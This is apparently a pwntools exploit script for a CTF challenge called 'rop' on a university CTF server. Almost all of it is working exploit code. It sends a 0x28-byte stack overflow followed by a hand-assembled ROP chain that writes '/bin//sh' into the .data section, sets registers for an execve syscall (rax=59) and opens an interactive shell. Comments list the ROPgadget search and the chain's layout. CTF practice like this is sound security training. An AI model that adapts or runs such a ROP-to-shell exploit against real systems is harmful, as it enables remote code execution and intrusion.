from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11005
p = remote(host, port)
context.arch = "amd64"
print(p.recvline())
#objdump -D rop | grep data
#ROPgadget --binary rop | egrep 'pop rsi ; ret|pop rax ; ret|mov qword ptr \[rsi\], rax ; ret|pop rdi ; ret'

p.sendline(b"A"*0x28 + b"\xa7\x17\x40\x00" + b"\x00\x00\x00\x00" + 
	   b"\x60\x00\x6c\x00" + b"\x00\x00\x00\x00" + b"\x08\xb4\x46\x00" + b"\x00\x00\x00\x00" +
	   b'/bin//sh' + b"\xd1\x7a\x46\x00" + b"\x00\x00\x00\x00" + 
	   b"\x93\x16\x40\x00" + b"\x00\x00\x00\x00" + b"\x60\x00\x6c\x00" + b"\x00\x00\x00\x00" +
	   b"\xf9\x71\x43\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" +
	   b"\x00\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\x08\xb4\x46\x00" + b"\x00\x00\x00\x00" +
	   b"\x3b\x00\x00\x00" + b"\x00\x00\x00\x00" + b"\xc5\xb4\x45\x00" + b"\x00\x00\x00\x00" )
p.interactive()

#Disassembly of section .data:
#00000000006c0060 <__data_start>:

#pop rsi ; ret  
#data section address      #pop rax ; ret
#'/bin//sh'                #mov qword ptr [rsi], rax ; ret
#pop rdi ; ret             #data section address
#pop rdx ; pop rsi ; ret   #set rdx = null
#set rsi = null            #pop rax ; ret
#set rax = 59              #syscall ; ret

